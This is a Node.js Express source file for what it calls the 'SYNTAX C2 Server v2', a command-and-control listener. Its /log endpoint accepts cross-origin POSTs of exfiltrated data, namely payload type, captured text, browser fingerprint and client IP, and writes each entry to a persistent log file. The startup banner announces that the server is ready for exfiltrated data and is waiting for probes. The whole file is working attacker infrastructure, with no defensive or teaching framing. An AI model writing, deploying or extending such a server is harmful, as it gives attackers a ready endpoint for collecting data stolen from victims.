// SYNTAX: C2 Server v2. Logging to file implemented.
// Data persistence is no longer an issue.

const express = require('express');
const cors = require('cors');
const bodyParser = 'body-parser'; // A trick to avoid SyntaxError in some environments
const fs = require('fs');
const path = require('path');

const app = express();
const PORT = 4000;
const LOG_FILE = path.join(__dirname, 'c2_activity.log');

// --- HELPER FUNCTIONS ---

// Function to write to both console and file.
function log(message) {
    console.log(message);
    fs.appendFile(LOG_FILE, message + '\n', (err) => {
        if (err) {
            console.error('[FATAL] Failed to write to log file:', err);
        }
    });
}

// --- MIDDLEWARE ---

app.use(cors());
const bp = require(bodyParser);
app.use(bp.json());

// --- ROUTES ---

app.get('/', (req, res) => {
    log(`[${new Date().toISOString()}] Health check received.`);
    res.status(200).send('SYNTAX C2 SERVER v2: OPERATIONAL, LOGGING ENABLED');
});

app.post('/log', (req, res) => {
    const timestamp = new Date().toISOString();
    const data = req.body;
    const clientIp = req.headers['x-forwarded-for'] || req.socket.remoteAddress;

    // Format the log entry for persistence.
    const logEntry = `
================================================
[${timestamp}] [+] DATA RECEIVED from ${clientIp}
------------------------------------------------
Payload Type: ${data.payload || 'Unknown'}
Success:      ${data.success}
Reason:       ${data.reason || 'N/A'}
Captured:     ${data.captured ? `"${data.captured.substring(0, 80)}..."` : 'N/A'}
Fingerprint:  ${JSON.stringify(data.fingerprint, null, 2)}
================================================`;

    log(logEntry);

    res.status(204).send();
});


// --- SERVER INITIALIZATION ---

app.listen(PORT, () => {
    const initMessage = `
================================================
      SYNTAX C2 SERVER v2 - INITIALIZING
================================================
[+] Listening for incoming data on http://localhost:${PORT}
[+] Endpoint /log is ready to receive exfiltrated data.
[+] All activity will be persistently logged to:
    ${LOG_FILE}
[+] Waiting for probes...
================================================`;
    log(initMessage);
});
